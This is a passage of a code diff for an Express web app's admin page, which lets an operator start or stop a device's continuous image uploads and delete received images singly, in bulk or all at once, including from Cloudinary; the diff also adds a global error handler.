-      function confirmDeleteSelectedImages() {
-        const count = document.querySelectorAll('.img-checkbox:checked').length;
-        if (count === 0) { alert('Please select at least one image.'); return; }
-        document.getElementById('deleteImagesMsg').textContent =
-          'Delete ' + count + ' selected image(s)? They will be removed from Cloudinary too.';
-        document.getElementById('deleteImagesModal').classList.add('open');
-      }
-      function confirmDeleteAllImages() {
-        document.getElementById('deleteImagesMsg').textContent =
-          'Delete ALL ${images.rows.length} images? They will be permanently removed from Cloudinary.';
-        document.getElementById('deleteImagesModal').classList.add('open');
-        document.getElementById('deleteImagesModal').dataset.deleteAll = 'true';
-      }
-      function submitImageDelete() {
-        const modal = document.getElementById('deleteImagesModal');
-        if (modal.dataset.deleteAll === 'true') {
-          modal.dataset.deleteAll = '';
-          document.getElementById('deleteAllImgsForm').submit();
-        } else {
-          document.getElementById('imgDeleteForm').submit();
+      <div class="page">
+        <a href="/users" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back to Users</a>
+        <div class="page-title" style="margin-top:16px;">Images</div>
+        <div class="page-subtitle" style="font-family:monospace;">${device}</div>
+        <div class="card">
+          <h3>&#9881; Upload Control &nbsp; ${statusBadge}</h3>
+          <p style="font-size:13px; color:#64748b; margin-bottom:20px;">
+            Start to allow the device to upload images continuously. Stop to pause all uploads from this device.
+          </p>
+          <div style="display:flex; gap:14px;">
+            <form method="POST" action="/control/${device}/start">
+              <button type="submit" class="btn btn-start" ${isUploading ? 'disabled style="opacity:0.4;cursor:not-allowed;"' : ''}>
+                &#9654; Start Upload
+              </button>
+            </form>
+            <form method="POST" action="/control/${device}/stop">
+              <button type="submit" class="btn btn-stop" ${!isUploading ? 'disabled style="opacity:0.4;cursor:not-allowed;"' : ''}>
+                &#9632; Stop Upload
+              </button>
+            </form>
+          </div>
+        </div>
+        <div class="card">
+          <h3 style="flex-wrap:wrap; gap:10px;">
+            &#128247; Received Images
+            <span class="count-badge">${images.rows.length}</span>
+            <div style="margin-left:auto; display:flex; gap:10px; flex-wrap:wrap;">
+              <button class="btn btn-red" style="font-size:13px; padding:8px 14px;" onclick="confirmDeleteSelectedImages()">
+                &#128465; Delete Selected (<span id="selectedImgCount">0</span>)
+              </button>
+              <button class="btn btn-red" style="font-size:13px; padding:8px 14px; background:#7f1d1d;" onclick="confirmDeleteAllImages()">
+                &#128465; Delete All
+              </button>
+            </div>
+          </h3>
+          ${images.rows.length > 0 ? `
+            <form id="imgDeleteForm" method="POST" action="/delete-images-selected">
+              <input type="hidden" name="device_id" value="${device}">
+              <div class="bulk-actions">
+                <label>
+                  <input type="checkbox" id="selectAllImgs" onchange="toggleAllImages(this)">
+                  Select All
+                </label>
+                <span class="selected-count">Click images or use checkboxes to select</span>
+              </div>
+              <div class="images-grid">${imgGrid}</div>
+            </form>
+          ` : '<div class="empty-state">No images uploaded yet.</div>'}
+          <form id="deleteAllImgsForm" method="POST" action="/delete-all-images/${device}" style="display:none;"></form>
+        </div>
+      </div>
+      <script>
+        function toggleImgSelect(id, event) {
+          const wrapper = document.getElementById('img-' + id);
+          const checkbox = wrapper.querySelector('.img-checkbox');
+          checkbox.checked = !checkbox.checked;
+          wrapper.classList.toggle('selected', checkbox.checked);
+          updateImgCount();
         }
-      }
-      function closeModal(id) {
-        const el = document.getElementById(id);
-        el.classList.remove('open');
-        if (el.dataset) el.dataset.deleteAll = '';
-      }
-    </script>
-  </body></html>
-  `);
+        function updateImgCount() {
+          const checked = document.querySelectorAll('.img-checkbox:checked');
+          document.getElementById('selectedImgCount').textContent = checked.length;
+          document.querySelectorAll('.img-wrapper').forEach(w => {
+            w.classList.toggle('selected', w.querySelector('.img-checkbox').checked);
+          });
+        }
+        function toggleAllImages(cb) {
+          document.querySelectorAll('.img-checkbox').forEach(c => c.checked = cb.checked);
+          updateImgCount();
+        }
+        function confirmDeleteSelectedImages() {
+          const count = document.querySelectorAll('.img-checkbox:checked').length;
+          if (count === 0) { alert('Select at least one image.'); return; }
+          document.getElementById('deleteImagesMsg').textContent = 'Delete ' + count + ' image(s)? Removed from Cloudinary too.';
+          document.getElementById('deleteImagesModal').classList.add('open');
+        }
+        function confirmDeleteAllImages() {
+          document.getElementById('deleteImagesMsg').textContent = 'Delete ALL ${images.rows.length} images permanently?';
+          document.getElementById('deleteImagesModal').classList.add('open');
+          document.getElementById('deleteImagesModal').dataset.deleteAll = 'true';
+        }
+        function submitImageDelete() {
+          const modal = document.getElementById('deleteImagesModal');
+          if (modal.dataset.deleteAll === 'true') {
+            modal.dataset.deleteAll = '';
+            document.getElementById('deleteAllImgsForm').submit();
+          } else {
+            document.getElementById('imgDeleteForm').submit();
+          }
+        }
+        function closeModal(id) {
+          const el = document.getElementById(id);
+          el.classList.remove('open');
+          if (el.dataset) el.dataset.deleteAll = '';
+        }
+      </script>
+    </body></html>
+    `);
+  } catch (err) {
+    res.status(500).send("Error loading images");
+  }
 });
 
-app.listen(process.env.PORT || 3000);
+// Global error handler — prevents server crashes on unhandled errors
+app.use((err, req, res, next) => {
+  console.error("Unhandled error:", err);
+  if (!res.headersSent) res.status(500).send("Internal server error");
+});
+
+app.listen(process.env.PORT || 3000, () => {
+  console.log("Server running on port", process.env.PORT || 3000);
+});
